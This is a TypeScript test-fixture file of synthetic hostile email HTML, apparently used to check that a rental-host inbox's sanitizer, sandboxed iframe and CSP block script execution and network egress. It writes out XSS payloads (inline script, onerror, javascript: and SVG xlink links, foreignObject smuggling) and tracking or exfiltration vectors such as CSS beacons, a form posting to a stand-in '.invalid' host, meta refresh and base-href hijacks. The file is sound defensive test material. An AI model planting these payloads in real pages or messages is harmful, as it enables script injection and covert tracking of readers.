/**
 * SYNTHETIC hostile mail HTML fixtures for T15 (design doc
 * alex-email-inbox-design-20260817-123909.md, Eng Review 6A).
 *
 * Every string below is hand-authored attack-pattern HTML, never a captured
 * or real Turo email. None of it approves anything about the renderer on
 * its own -- it exists to be thrown at the REAL rendering pipeline
 * (components/owner/mail-strip-html.ts -> mail-render-prep.ts ->
 * MailContentFrame.tsx's sandboxed srcdoc iframe) via
 * app/dev/mail-render-harness and assert the pipeline neutralizes it. See
 * tests/e2e/owner-mail-render-security.spec.ts.
 *
 * HOSTILE_TRACKING_HOST uses the RFC 2606 reserved `.invalid` TLD, which is
 * guaranteed to never resolve -- so even a fixture that "succeeds" at
 * getting the browser to *attempt* a request can never actually reach a
 * real host. The tests still assert on attempted requests (via Playwright's
 * request-interception), not merely on failed DNS, because the egress
 * guarantee under test is "the app never asks the network to try", not
 * "the attacker's domain happens not to exist".
 *
 * Each script/handler payload sets a `data-hostile-*` attribute on the
 * fixture's own <body> AND logs a `HOSTILE_EXEC:<id>` console marker if (and
 * only if) it actually runs. Both signals are asserted absent in the spec --
 * two independent ways to catch execution that survived stripping and
 * somehow also survived sandbox="" with no allow-scripts.
 */

export const HOSTILE_TRACKING_HOST = "hostile-mail-test.invalid";

export interface HostileMailFixture {
  id: string;
  description: string;
  html: string;
  inline?: Record<string, string>;
  /** Present when this fixture's payload sets a body attribute on execution. */
  markerAttribute?: string;
}

function hostileUrl(path: string): string {
  return `https://${HOSTILE_TRACKING_HOST}/${path}`;
}

/** A 1x1 transparent PNG, used as the cid: inline-image payload. */
export const TINY_PNG_DATA_URL =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";

export const SCRIPT_INLINE: HostileMailFixture = {
  id: "script-inline",
  description: "inline <script> tag with a body-attribute + console side effect",
  markerAttribute: "data-hostile-script-inline",
  html:
    '<p>Hi guest, your trip is confirmed.</p>'
    + '<script>'
    + 'document.body.setAttribute("data-hostile-script-inline","true");'
    + 'console.log("HOSTILE_EXEC:script-inline");'
    + "</script>",
};

export const SCRIPT_SRC: HostileMailFixture = {
  id: "script-src",
  description: "external <script src> pointing at a third-party host",
  html: `<p>Receipt attached.</p><script src="${hostileUrl("inject.js")}"></script>`,
};

export const ON_ERROR_HANDLER: HostileMailFixture = {
  id: "on-error-handler",
  description: "on* event-handler attribute (onerror on a deliberately broken image)",
  markerAttribute: "data-hostile-onerror",
  html:
    '<p>Your photo:</p>'
    + '<img src="not-a-real-image" alt="broken" '
    + 'onerror="document.body.setAttribute(&quot;data-hostile-onerror&quot;,&quot;true&quot;);console.log(&quot;HOSTILE_EXEC:on-error-handler&quot;)">',
};

export const JAVASCRIPT_HREF: HostileMailFixture = {
  id: "javascript-href",
  description: "javascript: URL on an <a href>, clicked programmatically by the test",
  markerAttribute: "data-hostile-js-href",
  html:
    '<p>Manage your trip:</p>'
    + '<a id="hostile-link" href="javascript:document.body.setAttribute(&quot;data-hostile-js-href&quot;,&quot;true&quot;);console.log(&quot;HOSTILE_EXEC:javascript-href&quot;)">Open trip</a>',
};

export const CSS_EXFIL_URL: HostileMailFixture = {
  id: "css-exfil-url",
  description: "<style> block with a CSS url() background pointing at a tracking host",
  html:
    `<style>body { background-image: url('${hostileUrl("css-beacon.png")}'); } `
    + `.hostile { background: url("${hostileUrl("css-beacon-2.png")}"); }</style>`
    + '<p class="hostile">Your booking is confirmed.</p>',
};

export const XMP_RAW_TEXT: HostileMailFixture = {
  id: "xmp-raw-text",
  description: "raw-text <xmp> element wrapping markup that must stay inert text",
  markerAttribute: "data-hostile-xmp",
  html:
    '<p>Trip details below:</p>'
    + '<xmp><script>document.body.setAttribute("data-hostile-xmp","true")</script></xmp>',
};

export const TEXTAREA_RAW_TEXT: HostileMailFixture = {
  id: "textarea-raw-text",
  description: "raw-text <textarea> element wrapping a breakout attempt",
  markerAttribute: "data-hostile-textarea",
  html:
    '<p>Notes:</p>'
    + '<textarea><script>document.body.setAttribute("data-hostile-textarea","true")</script></textarea>',
};

export const ENCODED_ENTITIES: HostileMailFixture = {
  id: "encoded-entities",
  description: "HTML-entity-encoded <script> tag that must decode to inert text, never live markup",
  markerAttribute: "data-hostile-entities",
  html:
    '<p>Reference: '
    + '&#x3C;script&#x3E;document.body.setAttribute(&#x27;data-hostile-entities&#x27;,&#x27;true&#x27;)&#x3C;/script&#x3E;'
    + "</p>",
};

export const MALFORMED_NESTING: HostileMailFixture = {
  id: "malformed-nesting",
  description: "unclosed tags, svg/script nesting, and a mutation-XSS-style broken attribute",
  markerAttribute: "data-hostile-malformed",
  html:
    '<div><p><b><i>Unclosed emphasis'
    + '<script>document.body.setAttribute("data-hostile-malformed","true")</script>'
    + '<svg><script>document.body.setAttribute("data-hostile-malformed","true")</script></svg>'
    + '<img """><script>document.body.setAttribute("data-hostile-malformed","true")</script>',
};

export const META_REFRESH: HostileMailFixture = {
  id: "meta-refresh",
  description: "meta http-equiv=refresh navigation vector",
  html:
    `<meta http-equiv="refresh" content="0;url=${hostileUrl("redirected")}">`
    + '<p>Your trip has ended.</p>',
};

export const REMOTE_IMAGE: HostileMailFixture = {
  id: "remote-image",
  description: "plain remote <img> (no script involved) -- must stay blocked until opt-in",
  html: `<p>Welcome!</p><img src="${hostileUrl("tracker.png")}" alt="remote tracker" data-testid="hostile-remote-img">`,
};

export const CID_IMAGE: HostileMailFixture = {
  id: "cid-image",
  description: "cid: embedded image resolved through the inline map to a data: URL",
  html: '<p>Your car:</p><img src="cid:logo-token" alt="logo" data-testid="cid-img">',
  inline: { "logo-token": TINY_PNG_DATA_URL },
};

export const SVG_XLINK_JAVASCRIPT: HostileMailFixture = {
  id: "svg-xlink-javascript",
  description: "inline <svg><a xlink:href=\"javascript:...\"> -- the SVG-namespaced sibling of javascript-href, a different attribute name the strip's href/src/action/formaction list must also cover",
  markerAttribute: "data-hostile-svg-xlink",
  html:
    '<p>Your vehicle:</p>'
    + '<svg width="100" height="40" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
    + '<a id="hostile-svg-link" xlink:href="javascript:document.body.setAttribute(&quot;data-hostile-svg-xlink&quot;,&quot;true&quot;);console.log(&quot;HOSTILE_EXEC:svg-xlink-javascript&quot;)">'
    + '<text x="0" y="20">Open</text></a></svg>',
};

export const BACKGROUND_ATTR_JAVASCRIPT: HostileMailFixture = {
  id: "background-attr-javascript",
  description: "legacy <table background=\"javascript:...\"> attribute -- must be stripped from the DOM, not merely inert",
  html:
    '<table id="hostile-bg-table" background="javascript:document.title=&quot;pwned&quot;">'
    + '<tr><td>Trip summary</td></tr></table>',
};

export const BACKGROUND_ATTR_EGRESS: HostileMailFixture = {
  id: "background-attr-egress",
  description: "legacy <table background=\"...\"> pointing at a tracking host -- an egress vector distinct from <img src>, must still be blocked by the CSP's img-src data: default",
  html: `<table id="hostile-bg-egress-table" background="${hostileUrl("bg-beacon.png")}"><tr><td>Trip summary</td></tr></table>`,
};

export const POSTER_ATTR_JAVASCRIPT: HostileMailFixture = {
  id: "poster-attr-javascript",
  description: "<video poster=\"javascript:...\"> attribute -- must be stripped from the DOM, not merely inert",
  html: '<video id="hostile-poster-video" poster="javascript:document.title=&quot;pwned&quot;" controls></video>',
};

export const POSTER_ATTR_EGRESS: HostileMailFixture = {
  id: "poster-attr-egress",
  description: "<video poster=\"...\"> pointing at a tracking host -- an image-load egress vector the CSP's img-src data: default must also block",
  html: `<video id="hostile-poster-egress-video" poster="${hostileUrl("poster-beacon.png")}" controls></video>`,
};

export const SVG_SCRIPT_FOREIGNOBJECT: HostileMailFixture = {
  id: "svg-script-foreignobject",
  description: "<svg> containing both a nested <script> and a <foreignObject> smuggling an HTML <script> across the SVG/HTML namespace boundary",
  markerAttribute: "data-hostile-svg-foreignobject",
  html:
    '<p>Trip photos:</p>'
    + '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    + '<script>document.body.setAttribute("data-hostile-svg-foreignobject","true");console.log("HOSTILE_EXEC:svg-script-foreignobject")</script>'
    + '<foreignObject width="100" height="100">'
    + '<body xmlns="http://www.w3.org/1999/xhtml">'
    + '<script>document.body.setAttribute("data-hostile-svg-foreignobject","true");console.log("HOSTILE_EXEC:svg-script-foreignobject")</script>'
    + '</body></foreignObject></svg>',
};

export const OBJECT_TAG: HostileMailFixture = {
  id: "object-tag",
  description: "<object data=\"...\"> plugin-embed vector pointed at a tracking host -- must be removed outright (REMOVED_TAG_NAMES) and never fetched",
  html: `<p>Attachment:</p><object id="hostile-object" data="${hostileUrl("payload.swf")}" type="application/x-shockwave-flash"></object>`,
};

export const EMBED_TAG: HostileMailFixture = {
  id: "embed-tag",
  description: "<embed src=\"...\"> plugin-embed vector pointed at a tracking host -- must be removed outright (REMOVED_TAG_NAMES) and never fetched",
  html: `<p>Attachment:</p><embed id="hostile-embed" src="${hostileUrl("payload.swf")}" type="application/x-shockwave-flash">`,
};

export const FORM_ACTION_SUBMIT: HostileMailFixture = {
  id: "form-action-submit",
  description: "<form action=\"...\"> with a submit control -- the whole <form> is stripped outright (REMOVED_TAG_NAMES), and the CSP's form-action 'none' is the second, independent wall behind that",
  html:
    '<p>Confirm your trip:</p>'
    + `<form id="hostile-form" action="${hostileUrl("submit")}" method="post">`
    + '<input type="hidden" name="tripId" value="123">'
    + '<button type="submit" id="hostile-submit">Confirm</button>'
    + "</form>",
};

export const BASE_HREF_HIJACK: HostileMailFixture = {
  id: "base-href-hijack",
  description: "<base href=\"...\"> rewriting every relative URL in the document to resolve against a tracking host -- not in REMOVED_TAG_NAMES, so the CSP's base-uri 'none' is the only wall",
  html:
    `<base href="${hostileUrl("")}">`
    + '<p>Manage your trip:</p>'
    + '<a id="hostile-relative-link" href="manage-trip">Open trip</a>',
};

export const FIXED_WIDTH_TABLE: HostileMailFixture = {
  id: "fixed-width-table",
  description: "650px fixed-width transactional table layout (Turo's real template norm)",
  html:
    '<table width="650" cellpadding="0" cellspacing="0" style="width:650px;border-collapse:collapse;">'
    + '<tr><td style="padding:24px;font-family:sans-serif;">'
    + '<h1 style="margin:0 0 12px;">Trip confirmed</h1>'
    + '<p data-testid="fixed-width-copy">Your rental is confirmed for Aug 20 – Aug 24. Pickup instructions below.</p>'
    + '</td></tr></table>',
};

/** Combines several egress-only vectors (no script) so one navigation can
 * assert zero requests reached a third-party host across all of them at
 * once -- the CSP's `img-src data:` default is the mechanism under test
 * here, not the DOMParser strip (a <style> url() and a bare <img> are not
 * script and are not in the strip's removed-tag list). */
export const KITCHEN_SINK_EGRESS: HostileMailFixture = {
  id: "kitchen-sink-egress",
  description: "remote <img> + CSS url() beacon + external <script src> + meta refresh, combined",
  html:
    `<meta http-equiv="refresh" content="0;url=${hostileUrl("redirected")}">`
    + `<style>body { background: url('${hostileUrl("css-beacon.png")}'); }</style>`
    + `<script src="${hostileUrl("inject.js")}"></script>`
    + `<img src="${hostileUrl("tracker.png")}" alt="tracker">`
    + '<p>Multiple vectors in one message.</p>',
};

/** Fixtures whose payload sets a body attribute + console marker on
 * execution -- the "zero script execution" test table. */
export const SCRIPT_EXECUTION_FIXTURES: HostileMailFixture[] = [
  SCRIPT_INLINE,
  ON_ERROR_HANDLER,
  JAVASCRIPT_HREF,
  XMP_RAW_TEXT,
  TEXTAREA_RAW_TEXT,
  ENCODED_ENTITIES,
  MALFORMED_NESTING,
  SVG_XLINK_JAVASCRIPT,
  SVG_SCRIPT_FOREIGNOBJECT,
];

/** Egress-only fixtures (no script involved) -- the "zero third-party
 * network egress" test table, covering vectors distinct from a plain
 * `<img src>` (background=/poster= URL attributes, <object>, <embed>). */
export const EGRESS_ONLY_FIXTURES: HostileMailFixture[] = [
  BACKGROUND_ATTR_EGRESS,
  POSTER_ATTR_EGRESS,
  OBJECT_TAG,
  EMBED_TAG,
];

export const ALL_HOSTILE_FIXTURES: HostileMailFixture[] = [
  ...SCRIPT_EXECUTION_FIXTURES,
  ...EGRESS_ONLY_FIXTURES,
  SCRIPT_SRC,
  CSS_EXFIL_URL,
  META_REFRESH,
  REMOTE_IMAGE,
  CID_IMAGE,
  FIXED_WIDTH_TABLE,
  KITCHEN_SINK_EGRESS,
  BACKGROUND_ATTR_JAVASCRIPT,
  POSTER_ATTR_JAVASCRIPT,
  FORM_ACTION_SUBMIT,
  BASE_HREF_HIJACK,
];
